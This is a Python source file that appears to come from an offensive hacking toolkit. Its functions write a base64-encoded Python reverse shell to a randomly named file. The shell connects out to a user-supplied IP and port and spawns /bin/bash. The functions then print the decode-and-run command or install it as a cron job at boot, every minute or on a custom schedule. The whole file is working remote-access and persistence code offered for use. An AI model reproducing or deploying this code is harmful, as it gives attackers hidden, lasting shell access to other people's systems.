import colors
import base64
import os
from colors import *
import util


def copyReverse(ip,port=1969,path=""):
    shell = """import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP",PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
"""
    shell=shell.replace("\n",";")
    shell=shell.replace("IP",ip)
    shell=shell.replace("PORT",str(port))
    filename = util.stringGenerator()
    path = os.path.join(path, filename)

    os.system(f"echo '{base64.b64encode(shell.encode('ascii')).decode('ascii')}' > {path}")
    return f"base64 -d {path} | python3 &"

def reverse(info=True):
    pInfo("Write 0 in any input to exit the current tool.")
    path = input("Copy in current folder o other folder?(type . for current or type folder) ")
    if path == '.':
        path = os.getcwd()
    elif not os.path.isdir(path):
        pError(f'Not a valid path.')
        return

    ip = input("Enter host ip: ")
    if not util.isIpv4(ip):
        pError(f'Not a valid ip.')
        return

    port = input("Select port number?(Enter for default [1969]) ")
    if port == '':
        code = copyReverse(ip,path=path)
    elif util.isInt(port):
        port = int(port)
        if not (1 <= port <= 65535):
            pError(f'Not in valid port range [1.65535].')
            return
        code = copyReverse(ip,port,path)
    else:
        pError(f'Not a valid number.')
        return
    if not info:
        return code
    pGood("The reverse shell has been created and enconded.")
    pInfo(f'Console command to execute shell: \n')
    pTest(code)

def cronBoot():
    code = reverse(False)
    util.addCron(code)

def cronLoop():
    code = reverse(False)
    util.addCron(code, condition="* * * * *")

def cronUser():
    code = reverse(False)
    cond = input("Inserte cronjob condition(* * * * *): ")
    util.addCron(code, condition=cond)